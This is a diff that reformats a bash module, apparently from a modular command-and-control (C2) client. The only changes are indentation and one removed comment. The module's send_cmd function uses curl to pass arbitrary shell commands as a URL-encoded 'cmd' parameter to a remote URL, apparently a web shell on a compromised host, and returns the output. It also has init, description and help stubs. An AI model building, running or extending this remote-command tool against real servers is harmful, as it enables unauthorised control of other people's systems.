@@ -1,17 +1,16 @@
 #!/usr/bin/env bash
 # Lightweight shell module for the modular C2 client.
-# English inline comments added; original code logic is left unchanged.
 
 # Initialize the module.
 # Expects a URL as the first argument and returns error if not provided.
 module_init() {
-        # URL is provided as the first positional parameter; default to empty if missing
-        URL="${1:-}"
-        # If URL is empty, print an error message and return non-zero
-        if [[ -z "$URL" ]]; then
-                echo "[!] shell_module_init: URL must be provided"
-                return 1
-        fi
+  # URL is provided as the first positional parameter; default to empty if missing
+  URL="${1:-}"
+  # If URL is empty, print an error message and return non-zero
+  if [[ -z "$URL" ]]; then
+    echo "[!] shell_module_init: URL must be provided"
+    return 1
+  fi
 }
 
 # send_cmd: send a shell command to the remote endpoint and extract its output.
@@ -22,25 +21,25 @@ module_init() {
 #   - performs an HTTP GET using curl and URL-encodes the command
 #   - strips everything before START and after END to return clean output
 send_cmd() {
-        local cmd="$1"
-        # Use curl to send a GET request with the URL-encoded 'cmd' parameter
-        curl -s --get --data-urlencode "cmd=$cmd" "$URL"
+  local cmd="$1"
+  # Use curl to send a GET request with the URL-encoded 'cmd' parameter
+  curl -s --get --data-urlencode "cmd=$cmd" "$URL"
 }
 
 # module_main: entry point when the module is executed.
 # Currently a no-op placeholder so the framework can call it without error.
 module_main() {
-        :
+  :
 }
 
 # module_description: short description of the module for listing modules.
 module_description() {
-        echo "Lightweight command execution module using GET requests."
+  echo "Lightweight command execution module using GET requests."
 }
 
 # show_module_help: prints usage information for this module.
 show_module_help() {
-        cat <<EOF
+  cat <<EOF
 Usage: $0 <URL>
 
 Description:
